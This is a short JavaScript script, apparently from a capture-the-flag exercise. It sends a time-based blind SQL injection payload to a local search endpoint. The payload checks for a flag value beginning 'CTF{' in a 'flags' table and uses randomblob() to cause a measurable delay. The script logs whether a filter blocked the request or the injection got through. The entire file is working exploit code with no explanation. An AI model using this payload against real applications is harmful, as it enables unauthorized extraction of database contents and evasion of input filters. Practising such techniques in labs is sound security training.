const bypassSearch = async (payload) => {
    const start = Date.now();
    const res = await fetch(`http://localhost:4000/api/search?q=${encodeURIComponent(payload)}`);
    const duration = Date.now() - start;
    if (res.status !== 403) {
      console.log(`[SUCCESS SEARCH] Payload: ${payload} | Status: ${res.status} | Time: ${duration}ms`);
    } else {
        console.log(`[BLOCKED SEARCH] Payload: ${payload}`);
    }
};

const run = async () => {
    await bypassSearch("%' AND 1=(SELECT 1 FROM flags WHERE flag_value LIKE 'CTF{%' AND randomblob(100000000)) AND '%'='");
};

run();
